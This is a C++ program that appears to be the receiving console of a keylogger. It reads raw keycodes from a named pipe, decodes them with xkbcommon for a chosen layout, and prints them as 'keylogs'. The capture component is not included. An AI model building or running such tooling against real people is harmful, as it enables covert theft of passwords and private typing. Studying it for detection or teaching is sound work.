#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/select.h>
#include <csignal>
#include <cstring>
#include <termios.h>
#include <xkbcommon/xkbcommon.h>

#define GREEN   "\033[32m"
#define RED     "\033[31m"
#define MAGENTA "\033[35m"
#define YELLOW  "\033[33m"
#define RESET   "\033[0m"

volatile bool shutdown_flag_ = false;

void handle_sigint(int) {
    shutdown_flag_ = true;
}

struct xkb_state* create_xkb_state(
    const char* layout, 
    struct xkb_context** out_ctx, 
    struct xkb_keymap** out_keymap
) {
    *out_ctx = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
    if (!*out_ctx) {
        return NULL;
    }

    struct xkb_rule_names names;
    names.rules = NULL;
    names.model = "pc105";
    names.layout = layout;
    names.variant = NULL;
    names.options = NULL;

    *out_keymap = xkb_keymap_new_from_names(*out_ctx, &names, XKB_KEYMAP_COMPILE_NO_FLAGS);
    if (!*out_keymap) {
        xkb_context_unref(*out_ctx);
        return NULL;
    }

    struct xkb_state* state = xkb_state_new(*out_keymap);
    if (!state) {
        xkb_keymap_unref(*out_keymap);
        xkb_context_unref(*out_ctx);
        return NULL;
    }

    return state;
}

// Conveert keycode to UTF-8 symbol based on layout
const char* keycode_to_utf8(struct xkb_state* state, xkb_keycode_t keycode) {
    xkb_keysym_t sym = xkb_state_key_get_one_sym(state, keycode);
    static char utf8[64];
    int len = xkb_keysym_to_utf8(sym, utf8, sizeof(utf8));
    if (len<=0) {
        return "[UNKNOWN]";
    }
    return utf8;
}

int main(int argc, char* argv[]) {
    setvbuf(stdout, nullptr, _IONBF, 0);

    std::string fifo_name = argv[1];
    std::string layout = argv[2];

    std::filesystem::create_directories("fifo");
    if (!std::filesystem::exists(fifo_name)) {
        if (mkfifo(fifo_name.c_str(), 0666) == -1) {
            std::cerr << RED << "Error while creating the fifo" << RESET << std::endl;
            return -1;
        }
    }

    int fd = open(fifo_name.c_str(), O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        std::cerr << RED << "Error while opening the fifo path: " << fifo_name << RESET << std::endl;
        return -1;
    }

    struct xkb_context* ctx;
    struct xkb_keymap* keymap;
    struct xkb_state* state = create_xkb_state(layout.c_str(), &ctx, &keymap);
    if (!state) {
        std::cerr << RED << "Error creating the keyboard state" << RESET << std::endl;
        return -1;
    }

    std::cout << GREEN << "[+] Connected to the output FIFO" << RESET << "\n";
    std::cout << GREEN << "\n\n====================Listening For Keylogs====================\n\n" << MAGENTA;

    std::signal(SIGINT, handle_sigint);

    fd_set read_fds;
    char buffer[1024];

    while (!shutdown_flag_) {
        FD_ZERO(&read_fds);
        FD_SET(fd, &read_fds);

        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 500000;

        int rc = select(fd + 1, &read_fds, nullptr, nullptr, &timeout);
        if (rc > 0 && FD_ISSET(fd, &read_fds)) {
            ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);
            if (bytes_read > 0) {
                if (bytes_read == sizeof(unsigned short)) {
                    unsigned short raw_code;
                    memcpy(&raw_code, buffer, sizeof(unsigned short));
                    xkb_keycode_t xkb_keycode = static_cast<xkb_keycode_t>(raw_code + 8);
                    const char* utf8_key = keycode_to_utf8(state, xkb_keycode);
                    printf("%s", utf8_key);
                } else {
                    buffer[bytes_read] = '\0';
                    std::string line(buffer);

                    if (line.find("[__end__]") != std::string::npos) {
                        std::cout << "\n" << MAGENTA << "[__end__]" << RESET << "\n";
                        break;
                    }
                    if (line.find("[__error__]") != std::string::npos) {
                        std::cout << "\n" << RED << line << RESET << "\n";
                        break;
                    }
                }
            }
        } else if (rc < 0) {
            std::cerr << RED << "An error occurred while reading from fifo: " << strerror(errno) << RESET << std::endl;
            break;
        }
    }

    std::cout << RESET;
    close(fd);
    std::filesystem::remove(fifo_name);

    std::cout << YELLOW << "[!] Press Enter to exit..." << RESET << "\n";
    std::cin.get();
    return 0;
}
